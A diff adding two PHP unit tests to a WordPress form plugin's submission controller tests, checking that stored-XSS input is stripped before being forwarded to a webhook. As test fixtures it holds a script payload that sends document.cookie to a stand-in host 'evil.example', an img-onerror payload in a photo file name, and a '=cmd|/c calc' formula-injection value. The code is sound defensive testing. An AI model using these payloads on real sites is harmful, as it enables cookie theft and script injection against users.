@@ -1307,3 +1307,88 @@ it(
 		expect( $stored['contact_name'] )->toBe( '=cmd|/c calc' );
 	}
 );
+
+// ---------------------------------------------------------------------------
+// End-to-end attack payload prevention (Step 6.6, ADR-0037)
+//
+// The rest of this file stubs sanitize_text_field() as an identity function
+// (returnArg(), set in this file's top-level beforeEach) since most tests
+// aren't exercising sanitization. These two tests need WordPress's real
+// tag/script-stripping behavior to prove an actual <script> payload is
+// neutralized end-to-end, so they override that stub locally.
+// ---------------------------------------------------------------------------
+
+it(
+	'neutralizes a realistic stored-XSS payload end-to-end: raw in storage, stripped in the webhook payload',
+	function (): void {
+		Functions\when( 'sanitize_text_field' )->alias(
+			static function ( string $str ): string {
+				$filtered = preg_replace( '@<(script|style)[^>]*?>.*?</\1>@si', '', $str );
+				$filtered = strip_tags( (string) $filtered );
+				$filtered = preg_replace( '/[\r\n\t ]+/', ' ', $filtered );
+				return trim( (string) $filtered );
+			}
+		);
+		$repo    = spy_repository( 1 );
+		$fwd     = spy_forwarder( ForwardResult::success() );
+		$ctrl    = new SubmissionController( $repo, $fwd );
+		$payload = valid_payload(
+			array(
+				'answers' => array(
+					'additional_notes' => '<script>document.location="http://evil.example/steal?c="+document.cookie</script>Please call after 5pm',
+				),
+			)
+		);
+
+		$ctrl->handle( make_request( $payload ) );
+
+		$stored    = json_decode( $repo->inserts[0]['answers_json'], true );
+		$forwarded = json_decode( $fwd->calls[0]['payload']['answers_json'], true );
+
+		expect( $stored['additional_notes'] )->toContain( '<script>' );
+		expect( $forwarded['additional_notes'] )->toBe( 'Please call after 5pm' );
+	}
+);
+
+it(
+	'neutralizes an img-onerror XSS payload in a photo originalName end-to-end',
+	function (): void {
+		Functions\when( 'sanitize_text_field' )->alias(
+			static function ( string $str ): string {
+				$filtered = preg_replace( '@<(script|style)[^>]*?>.*?</\1>@si', '', $str );
+				$filtered = strip_tags( (string) $filtered );
+				$filtered = preg_replace( '/[\r\n\t ]+/', ' ', $filtered );
+				return trim( (string) $filtered );
+			}
+		);
+		$repo          = spy_repository( 1 );
+		$fwd           = spy_forwarder( ForwardResult::success() );
+		$photo_storage = spy_photo_storage(
+			array( 'success' => true, 'url' => 'https://example.test/x.jpg', 'attachmentId' => 7 )
+		);
+		$ctrl    = new SubmissionController( $repo, $fwd, stub_media_validator_ok(), $photo_storage );
+		$payload = valid_payload(
+			array(
+				'answers' => array(
+					'site_photos' => array(
+						'files' => array(
+							array(
+								'fileId'       => 'f1',
+								'originalName' => '<img src=x onerror=alert(document.domain)>.jpg',
+								'mimeType'     => 'image/jpeg',
+								'dataBase64'   => 'fakeb64',
+							),
+						),
+					),
+				),
+			)
+		);
+
+		$ctrl->handle( make_request( $payload ) );
+
+		$forwarded_media = json_decode( $fwd->calls[0]['payload']['media_json'], true );
+
+		expect( $forwarded_media[0]['files'][0]['originalName'] )->not->toContain( '<' );
+		expect( $forwarded_media[0]['files'][0]['originalName'] )->toBe( '.jpg' );
+	}
+);
